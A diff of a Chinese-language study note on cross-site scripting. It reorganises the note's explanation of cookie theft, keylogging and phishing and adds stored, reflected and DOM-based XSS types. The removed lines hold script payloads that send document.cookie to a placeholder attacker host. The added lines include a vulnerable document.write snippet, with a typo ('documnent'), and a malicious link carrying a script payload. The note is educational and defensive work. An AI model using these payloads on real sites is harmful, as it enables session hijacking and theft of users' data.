@@ -1,6 +1,7 @@
 # XSS
 
 - [【译文】了解 XSS 攻击](https://zhuanlan.zhihu.com/p/21308080)
+- [如何让前端更安全？——XSS 攻击和防御详解](https://mp.weixin.qq.com/s/6ChuUdOm7vej8vQ3dbC8fw?)
 
 ## 一、什么是 XSS
 
@@ -10,35 +11,51 @@
 
 ## 二、恶意脚本能做啥
 
-- **Cookie 窃取**：攻击者能够通过`document.cookie`访问受害者与网站关联的 cookie，然后传送到攻击者自己的服务器，接着从这些 cookie 中提取敏感信息，如 Session ID。
-- **记录用户行为（Keylogging）**：攻击者可以使用 `addEventListener`方法注册用于监听键盘事件的回调函数，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。
-- **钓鱼网站（Phishing）**：攻击者可以通过修改 DOM 在页面上插入一个假的登陆框，也可以把表单的`action`属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息。
+### 1. Cookie 窃取：
 
-## 三、场景
+攻击者能够通过`document.cookie`访问受害者与网站关联的 cookie，然后传送到攻击者自己的服务器，接着从这些 cookie 中提取敏感信息，如 Session ID。
 
-1. 用户直接文本提交，页面直接回显
+### 2. 记录用户行为（Keylogging）
 
-```js
-<script>window.location='http://attacker/?cookie='+document.cookie</script>
-```
+攻击者可以使用 `addEventListener`方法注册用于监听键盘事件的回调函数，并且把所有用户的敲击行为发送到他自己的服务器，这些敲击行为可能记录着用户的敏感信息，比如密码和信用卡号码。
 
-2. 用户搜索关键字，包含脚本，页面直接先是搜索历史
+### 3. 钓鱼网站（Phishing）
+
+攻击者可以通过修改 DOM 在页面上插入一个假的登陆框，也可以把表单的`action`属性指向他自己的服务器地址，然后欺骗用户提交自己的敏感信息。
+
+## 三、XSS 攻击类型
+
+总体来说，XSS 分三类，存储型 XSS、反射型 XSS、基于 DOM 的 XSS 攻击。
+
+### 1. 存储型 XSS
+
+数据库中存有的存在 XSS 攻击的数据，返回给客户端。若数据未经过任何转义。被浏览器渲染。就可能导致 XSS 攻击；
+
+### 2. 反射型 XSS
+
+将用户输入的存在 XSS 攻击的数据，发送给后台，后台并未对数据进行存储，也未经过任何过滤，直接返回给客户端。被浏览器渲染。就可能导致 XSS 攻击；
+
+### 3. DOM-XSS
+
+纯粹发生在客户端的 XSS 攻击，比如：http://www.some.site/page.html?default=French
 
 ```html
-<!-- http://website/search?keyword=<script>...</script> -->
-
-<html>
-  You searched for:
+<select>
   <script>
-    window.location = 'http://attacker/?cookie=' + document.cookie
+    document.write(
+      '<option value=1>' +
+        document.location.href.substring(documnent.location.href.indexOf('default=') + 8) +
+        '</option>',
+    )
+    document.write('<option value=2>English</option>')
   </script>
-</html>
+</select>
 ```
 
-3. 页面链接配置了 JavaScript:
+恶意链接
 
-```js
-document.querySelector('a').href = 'javascript:alert(document.cookie)'
+```
+http://www.some.site/page.html?default=<script>alert(document.cookie)</script>
 ```
 
 ## 四、避免
